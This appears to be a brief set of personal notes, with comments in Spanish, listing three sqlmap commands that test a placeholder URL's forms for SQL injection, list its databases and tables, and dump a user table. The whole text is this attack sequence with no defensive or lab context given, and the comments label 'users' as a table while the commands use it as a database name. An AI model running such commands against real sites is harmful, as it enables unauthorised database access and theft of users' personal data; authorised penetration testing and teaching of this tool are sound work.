sqlmap -u [URL] --forms --batch --dbs
(Por ejemplo sale que tiene la tabla users)

sqlmap -u [URL] --forms --batch -D users --tables
(Tabla usuarios)

sqlmap -u [URL] --forms --batch -D users -T usuarios --dump
